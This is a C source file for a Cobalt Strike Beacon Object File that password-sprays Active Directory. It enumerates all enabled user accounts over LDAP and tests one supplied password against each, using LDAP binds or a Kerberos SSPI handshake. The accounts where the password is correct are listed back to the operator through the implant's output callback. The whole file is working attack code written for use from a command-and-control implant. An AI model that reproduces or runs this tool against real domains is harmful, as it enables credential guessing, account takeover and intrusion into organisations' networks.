#define SECURITY_WIN32 

#include <windows.h>
#include <activeds.h>
#include <dsgetdc.h>
#include <lm.h>
#include <security.h>

#include "SprayAD.h"
#include "beacon.h"

#define BUF_SIZE 512
#define MAXTOKENSIZE 48000

INT iGarbage = 1;
LPSTREAM lpStream = (LPSTREAM)1;
PDOMAIN_CONTROLLER_INFOW pdcInfo = (PDOMAIN_CONTROLLER_INFOW)1;

HRESULT BeaconPrintToStreamW(_In_z_ LPCWSTR lpwFormat, ...) {
	HRESULT hr = S_OK;
	va_list argList;
	WCHAR chBuffer[1024];
	DWORD dwWritten = 0;

	if (lpStream <= (LPSTREAM)1) {
		hr = OLE32$CreateStreamOnHGlobal(NULL, TRUE, &lpStream);
		if (FAILED(hr)) {
			return hr;
		}
	}

	va_start(argList, lpwFormat);
	MSVCRT$memset(chBuffer, 0, sizeof(chBuffer));
	if (!MSVCRT$_vsnwprintf_s(chBuffer, _countof(chBuffer), _TRUNCATE, lpwFormat, argList)) {
		hr = E_FAIL;
		goto CleanUp;
	}

	if (FAILED(hr = lpStream->lpVtbl->Write(lpStream, chBuffer, (ULONG)MSVCRT$wcslen(chBuffer) * sizeof(WCHAR), &dwWritten))) {
		goto CleanUp;
	}

CleanUp:

	va_end(argList);
	return hr;
}

VOID BeaconOutputStreamW() {
	STATSTG ssStreamData = { 0 };
	SIZE_T cbSize = 0;
	ULONG cbRead = 0;
	LARGE_INTEGER pos;
	LPWSTR lpwOutput = NULL;

	if (FAILED(lpStream->lpVtbl->Stat(lpStream, &ssStreamData, STATFLAG_NONAME))) {
		return;
	}

	cbSize = ssStreamData.cbSize.LowPart;
	lpwOutput = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, cbSize + 1);
	if (lpwOutput != NULL) {
		pos.QuadPart = 0;
		if (FAILED(lpStream->lpVtbl->Seek(lpStream, pos, STREAM_SEEK_SET, NULL))) {
			goto CleanUp;
		}

		if (FAILED(lpStream->lpVtbl->Read(lpStream, lpwOutput, (ULONG)cbSize, &cbRead))) {		
			goto CleanUp;
		}

		BeaconPrintf(CALLBACK_OUTPUT, "%ls", lpwOutput);
	}

CleanUp:

	if (lpStream != NULL) {
		lpStream->lpVtbl->Release(lpStream);
		lpStream = NULL;
	}

	if (lpwOutput != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, lpwOutput);
	}

	return;
}

void GetFormattedErrMsg(_In_ HRESULT hr) {
    LPWSTR lpwErrorMsg = NULL;

    KERNEL32$FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,  
	NULL,
	(DWORD)hr,
	MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
	(LPWSTR)&lpwErrorMsg,
	0,
	NULL);

	if (lpwErrorMsg != NULL) {
		BeaconPrintf(CALLBACK_ERROR, "HRESULT 0x%08lx: %ls", hr, lpwErrorMsg);
		KERNEL32$LocalFree(lpwErrorMsg);
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "HRESULT 0x%08lx", hr);
	}

    return;
}

BOOL LogonUserSSPI(_In_ LPWSTR pszSSP, _In_ LPWSTR pszAuthority, _In_ LPWSTR pszPrincipal, _In_ LPWSTR pszPassword) {
	BOOL bResult = FALSE;
	PBYTE pBufC2S = NULL;
	PBYTE pBufS2C = NULL;

	HINSTANCE hModule = LoadLibraryA("Secur32.dll");
	if (hModule == NULL) {
		return FALSE;
	}

	// Here's where we specify the credentials to verify:
	SEC_WINNT_AUTH_IDENTITY_EXW authIdent = {
		SEC_WINNT_AUTH_IDENTITY_VERSION,
		sizeof authIdent,
		(unsigned short *)pszPrincipal,
		KERNEL32$lstrlenW(pszPrincipal),
		(unsigned short *)pszAuthority,
		KERNEL32$lstrlenW(pszAuthority),
		(unsigned short *)pszPassword,
		KERNEL32$lstrlenW(pszPassword),
		SEC_WINNT_AUTH_IDENTITY_UNICODE,
		0, 0
	};

	// Get an SSPI handle for these credentials.
	CredHandle hcredClient;
	TimeStamp expiryClient;
	SECURITY_STATUS Status = SECUR32$AcquireCredentialsHandleW(0, pszSSP,
		SECPKG_CRED_OUTBOUND,
		0, &authIdent,
		0, 0,
		&hcredClient,
		&expiryClient);
	if (Status) {
		return FALSE;
	}

	// Use the caller's credentials for the server.
	CredHandle hcredServer;
	TimeStamp expiryServer;
	Status = SECUR32$AcquireCredentialsHandleW(0, pszSSP,
		SECPKG_CRED_INBOUND,
		0, 0, 0, 0,
		&hcredServer,
		&expiryServer);
	if (Status) {
		return FALSE;
	}

	CtxtHandle hctxClient;
	CtxtHandle hctxServer;

	// Create two buffers:
	//    one for the client sending tokens to the server,
	//    one for the server sending tokens to the client
	// (buffer size chosen based on current Kerb SSP setting for cbMaxToken - you may need to adjust this)
	pBufC2S = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAXTOKENSIZE);
	if (pBufC2S == NULL) {
		goto CleanUp;
	}
	
	pBufS2C = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, MAXTOKENSIZE);
	if (pBufS2C == NULL) {
		goto CleanUp;
	}
	
	SecBuffer sbufC2S = { MAXTOKENSIZE, SECBUFFER_TOKEN, pBufC2S };
	SecBuffer sbufS2C = { MAXTOKENSIZE, SECBUFFER_TOKEN, pBufS2C };
	SecBufferDesc bdC2S = { SECBUFFER_VERSION, 1, &sbufC2S };
	SecBufferDesc bdS2C = { SECBUFFER_VERSION, 1, &sbufS2C };

	// Don't really need any special context attributes.
	DWORD grfRequiredCtxAttrsClient = ISC_REQ_CONNECTION;
	DWORD grfRequiredCtxAttrsServer = ISC_REQ_CONNECTION;

	// Set up some aliases to make it obvious what's happening.
	PCtxtHandle pClientCtxHandleIn = 0;
	PCtxtHandle pClientCtxHandleOut = &hctxClient;
	PCtxtHandle pServerCtxHandleIn = 0;
	PCtxtHandle pServerCtxHandleOut = &hctxServer;

	SecBufferDesc* pClientInput = 0;
	SecBufferDesc* pClientOutput = &bdC2S;
	SecBufferDesc* pServerInput = &bdC2S;
	SecBufferDesc* pServerOutput = &bdS2C;

	DWORD grfCtxAttrsClient = 0;
	DWORD grfCtxAttrsServer = 0;
	TimeStamp expiryClientCtx;
	TimeStamp expiryServerCtx;

	// Since the caller is acting as the server, we need a server principal name
	// so that the client will be able to get a Kerb ticket (if Kerb is used).
	WCHAR szSPN[256];
	ULONG cchSPN = sizeof szSPN / sizeof *szSPN;
	SECUR32$GetUserNameExW(NameSamCompatible, szSPN, &cchSPN);

	// Perform the authentication handshake, playing the role of both client *and* server.
	BOOL bClientContinue = TRUE;
	BOOL bServerContinue = TRUE;
	while (bClientContinue || bServerContinue) {
		if (bClientContinue) {
			sbufC2S.cbBuffer = MAXTOKENSIZE;
			Status = SECUR32$InitializeSecurityContextW(
				&hcredClient, pClientCtxHandleIn,
				(PSECURITY_STRING)szSPN,
				grfRequiredCtxAttrsClient,
				0, SECURITY_NATIVE_DREP,
				pClientInput, 0,
				pClientCtxHandleOut,
				pClientOutput,
				&grfCtxAttrsClient,
				&expiryClientCtx);
			switch (Status) {
			case SEC_E_OK:
				bClientContinue = FALSE;
				break;
			case SEC_I_CONTINUE_NEEDED:
				pClientCtxHandleIn = pClientCtxHandleOut;
				pClientInput = pServerOutput;
				break;
			default:
				SECUR32$FreeCredentialsHandle(&hcredClient);
				SECUR32$FreeCredentialsHandle(&hcredServer);
				goto CleanUp;
			}
		}

		if (bServerContinue) {
			sbufS2C.cbBuffer = MAXTOKENSIZE;
			Status = SECUR32$AcceptSecurityContext(
				&hcredServer, pServerCtxHandleIn,
				pServerInput,
				grfRequiredCtxAttrsServer,
				SECURITY_NATIVE_DREP,
				pServerCtxHandleOut,
				pServerOutput,
				&grfCtxAttrsServer,
				&expiryServerCtx);
			switch (Status) {
			case SEC_E_OK:
				bServerContinue = FALSE;
				break;
			case SEC_I_CONTINUE_NEEDED:
				pServerCtxHandleIn = pServerCtxHandleOut;
				break;
			default:
				SECUR32$FreeCredentialsHandle(&hcredClient);
				SECUR32$FreeCredentialsHandle(&hcredServer);
				goto CleanUp;
			}
		}
	}

	// Clean up
	SECUR32$FreeCredentialsHandle(&hcredClient);
	SECUR32$FreeCredentialsHandle(&hcredServer);
	SECUR32$DeleteSecurityContext(pServerCtxHandleOut);
	SECUR32$DeleteSecurityContext(pClientCtxHandleOut);
	bResult = TRUE;

CleanUp:

	if (pBufC2S != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pBufC2S);
	}

	if (pBufS2C != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pBufS2C);
	}

	return bResult;
}

HRESULT SprayUsers(_In_ IDirectorySearch *pContainerToSearch, _In_ LPCWSTR lpwSprayPasswd, _In_ LPCWSTR lpwFilter, _In_ BOOL bLdapAuth) {
	HRESULT hr = S_OK;
	WCHAR wcSearchFilter[BUF_SIZE] = { 0 };
	LPCWSTR pszAttrFilter[] = { L"sAMAccountName"};
	LPCWSTR lpwFormat = L"(&(objectClass=user)(objectCategory=person)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(sAMAccountName=%ls))"; // Only enabled accounts
	PUSER_INFO pUserInfo = NULL;
	INT iCount = 0;
	DWORD x = 0L;
	LPWSTR pszColumn = NULL;
	IADs *pRoot = NULL;
	IID IADsIID;
	ADS_SEARCH_COLUMN col;
	DWORD dwAccountsTested = 0;
	DWORD dwAccountsFailed = 0;
	DWORD dwAccountsSuccess = 0;

	_ADsOpenObject ADsOpenObject = (_ADsOpenObject)
		GetProcAddress(GetModuleHandleA("Activeds.dll"), "ADsOpenObject");
	if (ADsOpenObject == NULL) {
		return S_FALSE;
	}

	_FreeADsMem FreeADsMem = (_FreeADsMem)
		GetProcAddress(GetModuleHandleA("Activeds.dll"), "FreeADsMem");
	if (FreeADsMem == NULL) {
		return S_FALSE;
	}

	if (!pContainerToSearch) {
		return E_POINTER;
	}

	// Calculate Program run time.
	LARGE_INTEGER frequency;
	LARGE_INTEGER start;
	LARGE_INTEGER end;
	double interval;

	KERNEL32$QueryPerformanceFrequency(&frequency);
	KERNEL32$QueryPerformanceCounter(&start);

	// Specify subtree search
	ADS_SEARCHPREF_INFO SearchPrefs;
	SearchPrefs.dwSearchPref = ADS_SEARCHPREF_PAGESIZE;
	SearchPrefs.vValue.dwType = ADSTYPE_INTEGER;
	SearchPrefs.vValue.Integer = 1000;
	DWORD dwNumPrefs = 1;

	// Handle used for searching
	ADS_SEARCH_HANDLE hSearch = NULL;

	// Set the search preference
	hr = pContainerToSearch->lpVtbl->SetSearchPreference(pContainerToSearch, &SearchPrefs, dwNumPrefs);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to set search preference.\n");
		goto CleanUp;
	}

	// Add the filter.
	if (lpwFilter == NULL) {
		lpwFilter = L"*";
	}
	MSVCRT$swprintf_s(wcSearchFilter, BUF_SIZE, lpwFormat, lpwFilter);

	pUserInfo = (PUSER_INFO)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(USER_INFO));
	if (pUserInfo == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to allocate UserInfo memory.\n");
		goto CleanUp;
	}

	// Return specified properties
	hr = pContainerToSearch->lpVtbl->ExecuteSearch(pContainerToSearch, wcSearchFilter, (LPWSTR*)pszAttrFilter, sizeof(pszAttrFilter) / sizeof(LPWSTR), &hSearch);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to execute search.\n");
		goto CleanUp;
	}

	// Resolve IID from GUID string.
	if (bLdapAuth) {
		LPCOLESTR pIADsIID = L"{FD8256D0-FD15-11CE-ABC4-02608C9E7553}";
		HRESULT hr = OLE32$IIDFromString(pIADsIID, &IADsIID);
		if (FAILED(hr)) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to resolve IID.\n");
			goto CleanUp;
		}
	}

	if (SUCCEEDED(hr)) {	
		// Call IDirectorySearch::GetNextRow() to retrieve the next row of data.
		hr = pContainerToSearch->lpVtbl->GetFirstRow(pContainerToSearch, hSearch);
		if (SUCCEEDED(hr)) {
			while (hr != S_ADS_NOMORE_ROWS) {
				// Keep track of count.
				iCount++;

				// Loop through the array of passed column names.
				while (pContainerToSearch->lpVtbl->GetNextColumnName(pContainerToSearch, hSearch, &pszColumn) != S_ADS_NOMORE_COLUMNS) {
					hr = pContainerToSearch->lpVtbl->GetColumn(pContainerToSearch, hSearch, pszColumn, &col);
					if (SUCCEEDED(hr)) {
						if (col.dwADsType == ADSTYPE_CASE_IGNORE_STRING) {
							for (x = 0; x < col.dwNumValues; x++) {
								if (MSVCRT$_wcsicmp(col.pszAttrName, L"sAMAccountName") == 0) {
									if (dwAccountsTested > 0 && dwAccountsTested % 100 == 0) {
										BeaconPrintf(CALLBACK_OUTPUT, "[*] Sprayed Accounts: %d\n", dwAccountsTested);
									}
									if (bLdapAuth) {
										hr = ADsOpenObject(L"LDAP://rootDSE",
											col.pADsValues->CaseIgnoreString,
											lpwSprayPasswd,
											ADS_SECURE_AUTHENTICATION | ADS_FAST_BIND, // Use Secure Authentication
											&IADsIID,
											(void**)&pRoot);
										if (FAILED(hr)) {
											dwAccountsFailed = dwAccountsFailed + 1;
											dwAccountsTested = dwAccountsTested + 1;
										}
										if (SUCCEEDED(hr)) {
											BeaconPrintf(CALLBACK_OUTPUT, "[+] Password correct for useraccount: %ls\n", col.pADsValues->CaseIgnoreString);
											MSVCRT$wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);											

											dwAccountsSuccess = dwAccountsSuccess + 1;
											dwAccountsTested = dwAccountsTested + 1;
										}								
										if (pRoot){
											pRoot->lpVtbl->Release(pRoot);
											pRoot = NULL;
										}
									}
									else{
										BOOL bResult = LogonUserSSPI(L"Kerberos", 
											pdcInfo->DomainName, 
											col.pADsValues->CaseIgnoreString, 
											(LPWSTR)lpwSprayPasswd);

										if (!bResult) {
											dwAccountsFailed = dwAccountsFailed + 1;
											dwAccountsTested = dwAccountsTested + 1;
										}
										if (bResult) {
											BeaconPrintf(CALLBACK_OUTPUT, "[+] Password correct for useraccount: %ls\n", col.pADsValues->CaseIgnoreString);
											MSVCRT$wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);											

											dwAccountsSuccess = dwAccountsSuccess + 1;
											dwAccountsTested = dwAccountsTested + 1;
										}
									}
									break;
								}
							}
						}

						pContainerToSearch->lpVtbl->FreeColumn(pContainerToSearch, &col);
					}

					if (pszColumn != NULL) {
						FreeADsMem(pszColumn);
					}
				}

				if (dwAccountsSuccess == MAX_RESULTS) {
					BeaconPrintf(CALLBACK_ERROR, "Maximum result limit reached (%d successful results)\n", MAX_RESULTS);
					break;
				}
				else{
					// Get the next row
					hr = pContainerToSearch->lpVtbl->GetNextRow(pContainerToSearch, hSearch);
				}

			}
		}
		// Close the search handle to clean up
		pContainerToSearch->lpVtbl->CloseSearchHandle(pContainerToSearch, hSearch);
	}

	if (SUCCEEDED(hr) && 0 == iCount) {
		hr = S_FALSE;
	}

	if (dwAccountsSuccess >= 1) {
		BeaconPrintToStreamW(L"--------------------------------------------------------------------\n");
		BeaconPrintToStreamW(L"[+] Password correct for useraccount(s):\n");
		for (x = 0; x < MAX_RESULTS; x++) {
			if (MSVCRT$_wcsicmp(pUserInfo->chuserPrincipalName[x], L"") == 0) {
				break;
			}
			else {
				BeaconPrintToStreamW(L"    %ls\r\n", pUserInfo->chuserPrincipalName[x]);
			}
		}
	}

	KERNEL32$QueryPerformanceCounter(&end);
	interval = (double)(end.QuadPart - start.QuadPart) / frequency.QuadPart;

	BeaconPrintToStreamW(L"--------------------------------------------------------------------\n");
	BeaconPrintToStreamW(L"Program execution time: %0.2f seconds\n\n", interval);

	BeaconPrintToStreamW(L"Domain tested: %ls\n", pdcInfo->DomainName);
	BeaconPrintToStreamW(L"Applied LDAP filter: %ls\n", wcSearchFilter);
	BeaconPrintToStreamW(L"Password tested: %ls\n\n", lpwSprayPasswd);

	BeaconPrintToStreamW(L"Total AD accounts tested: %d\n", dwAccountsTested);

	BeaconPrintToStreamW(L"Failed %ls authentications: %d\n", bLdapAuth ? L"LDAP" : L"Kerberos", dwAccountsFailed);
	BeaconPrintToStreamW(L"Successful %ls authentications: %d\n", bLdapAuth ? L"LDAP" : L"Kerberos", dwAccountsSuccess);

	BeaconPrintToStreamW(L"--------------------------------------------------------------------\n");

CleanUp:

	//Print final Output
	BeaconOutputStreamW();
	
	if (pUserInfo != NULL) {
		KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pUserInfo);
	}

	return hr;
}

HRESULT SearchDirectory(_In_ LPCWSTR lpwSprayPasswd, _In_ LPCWSTR lpwFilter, _In_ BOOL bLdapAuth) {
	HRESULT hr = S_OK;
	HINSTANCE hModule = NULL;
	IADs* pRoot = NULL;
	IDirectorySearch* pContainerToSearch = NULL;
	IID IADsIID, IDirectorySearchIID;

	WCHAR wcPathName[BUF_SIZE] = { 0 };
	VARIANT var;

	hModule = LoadLibraryA("Activeds.dll");
	_ADsOpenObject ADsOpenObject = (_ADsOpenObject)
		GetProcAddress(hModule, "ADsOpenObject");
	if (ADsOpenObject == NULL) {
		return hr;
	}

	DWORD dwRet = NETAPI32$DsGetDcNameW(NULL, NULL, NULL, NULL, 0, &pdcInfo);
	if (dwRet != ERROR_SUCCESS) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get domain/dns info.");
		goto CleanUp;
	}

	// Initialize COM.
	hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (FAILED(hr)) {
		goto CleanUp;
	}

	// Resolve IID from GUID string.
	LPCOLESTR pIADsIID = L"{FD8256D0-FD15-11CE-ABC4-02608C9E7553}";
	LPCOLESTR pIDirectorySearchIID = L"{109BA8EC-92F0-11D0-A790-00C04FD8D5A8}";

	hr = OLE32$IIDFromString(pIADsIID, &IADsIID);
	hr = OLE32$IIDFromString(pIDirectorySearchIID, &IDirectorySearchIID);

	// Get rootDSE and the current user's domain container DN.
	hr = ADsOpenObject(L"LDAP://rootDSE",
		NULL,
		NULL,
		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
		&IADsIID,
		(void**)&pRoot);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get rootDSE.\n");
		goto CleanUp;
	}

	OLEAUT32$VariantInit(&var);
	hr = pRoot->lpVtbl->Get(pRoot, (BSTR)L"defaultNamingContext", &var);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to get defaultNamingContext.");
		goto CleanUp;
	}

	MSVCRT$wcscpy_s(wcPathName, _countof(wcPathName), L"LDAP://");
	MSVCRT$wcscat_s(wcPathName, _countof(wcPathName), var.bstrVal);

	hr = ADsOpenObject((LPCWSTR)wcPathName,
		NULL,
		NULL,
		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
		&IDirectorySearchIID,
		(void**)&pContainerToSearch);
	if (FAILED(hr)) {
		BeaconPrintf(CALLBACK_ERROR, "ADsOpenObject failed.\n");
		goto CleanUp;
	}

	hr = SprayUsers(pContainerToSearch,	lpwSprayPasswd, lpwFilter, bLdapAuth);

CleanUp:

	if (pdcInfo != NULL) {
		NETAPI32$NetApiBufferFree(pdcInfo);
	}

	if (pContainerToSearch != NULL) {
		pContainerToSearch->lpVtbl->Release(pContainerToSearch);
		pContainerToSearch = NULL;
	}

	if(pRoot != NULL){
		pRoot->lpVtbl->Release(pRoot);
		pRoot = NULL;
	}

	OLE32$CoUninitialize();

	return hr;
}

VOID go(IN PCHAR Args, IN ULONG Length) {
	HRESULT hr = S_OK;
	BOOL bLdapAuth = FALSE;
	LPCWSTR lpwSprayPasswd = NULL;
	LPCWSTR lpwLdapFilter = NULL;
	LPCWSTR lpwAuthService = NULL;

	// Parse Arguments
	datap parser;
	BeaconDataParse(&parser, Args, Length);
	
	lpwSprayPasswd = (WCHAR*)BeaconDataExtract(&parser, NULL);
	if (lpwSprayPasswd == NULL) {
		BeaconPrintf(CALLBACK_ERROR, "No password specified!\n");
		return;
	}
	lpwLdapFilter = (WCHAR*)BeaconDataExtract(&parser, NULL);
	lpwAuthService = (WCHAR*)BeaconDataExtract(&parser, NULL);
	if (lpwAuthService != NULL && MSVCRT$_wcsicmp(lpwAuthService, L"ldap") == 0) {
		bLdapAuth = TRUE;
	}

	hr = SearchDirectory(lpwSprayPasswd, lpwLdapFilter, bLdapAuth);
	if (FAILED(hr)) {
		GetFormattedErrMsg(hr);
	}

	return;
}
